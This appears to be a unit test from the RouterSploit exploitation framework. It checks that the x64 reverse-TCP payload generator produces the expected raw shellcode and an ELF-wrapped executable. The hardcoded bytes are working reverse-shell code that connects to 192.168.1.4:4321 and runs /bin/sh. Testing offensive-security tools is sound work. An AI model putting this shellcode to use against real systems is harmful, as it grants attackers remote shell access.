from routersploit.modules.payloads.x64.reverse_tcp import Payload


# reverse tcp with lhost=192.168.1.4  lport=4321
reverse_tcp = (
    b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
    b"\xb9\x02\x00\x10\xe1\xc0\xa8\x01\x04\x51\x48\x89\xe6\x6a\x10"
    b"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
    b"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
    b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
)

# elf x64 reverse tcp
elf_x64_reverse_tcp = (
    b"\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00"
    b"\x00\x02\x00\x3e\x00\x01\x00\x00\x00\x78\x00\x40\x00\x00\x00"
    b"\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    b"\x00\x00\x00\x00\x00\x00\x00\x40\x00\x38\x00\x01\x00\x00\x00"
    b"\x00\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00"
    b"\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00"
    b"\x40\x00\x00\x00\x00\x00\xc2\x00\x00\x00\x00\x00\x00\x00\x0c"
    b"\x01\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00"
    b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
    b"\xb9\x02\x00\x10\xe1\xc0\xa8\x01\x04\x51\x48\x89\xe6\x6a\x10"
    b"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
    b"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
    b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
)


def test_payload_generation():
    """ Test scenario - payload generation """

    payload = Payload()
    payload.lhost = "192.168.1.4"
    payload.lport = 4321

    assert payload.generate() == reverse_tcp
    assert payload.generate_elf(reverse_tcp) == elf_x64_reverse_tcp
